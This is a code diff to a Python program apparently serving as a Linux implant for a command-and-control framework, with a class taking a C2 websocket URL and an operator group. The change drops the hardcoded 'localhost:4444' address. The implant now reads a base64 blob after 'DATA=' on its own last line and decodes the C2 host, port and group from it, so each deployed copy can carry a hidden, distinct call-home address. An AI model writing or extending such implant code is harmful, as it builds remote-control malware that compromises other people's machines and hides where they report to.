@@ -607,14 +607,24 @@ class LinuxImpl:
 
 if __name__ == "__main__":
 
+    impl_path = os.path.abspath(sys.argv[0])
+    pyl = ""
+    with open(impl_path, "rb") as f:
+        f.seek(-2, 2)
+        while f.read(1) != b"\n":
+            f.seek(-2, 1)
+        pyl = f.readline().strip().decode(errors="ignore").split(" ")[-1].split('DATA=')[1]
     
-    C2_WS_URL = "localhost:4444"
-    GROUP_NAME = "grupo"
     
+    pyl = base64.b64decode(pyl.strip()).decode('utf-8').split('|')
+    
+    url = pyl[1]
+    port = pyl[2]
+    group = pyl[3]
 
-
+    C2_WS_URL = f"{url}:{port}"
     
-    impl = LinuxImpl(c2_ws_url=C2_WS_URL, group=GROUP_NAME)
+    impl = LinuxImpl(c2_ws_url=C2_WS_URL, group=group)
     
     def signal_handler(sig, frame):
         impl.running = False
@@ -628,4 +638,4 @@ if __name__ == "__main__":
     except KeyboardInterrupt:
         impl.running = False
     except Exception as e:
-        raise       
+        raise        
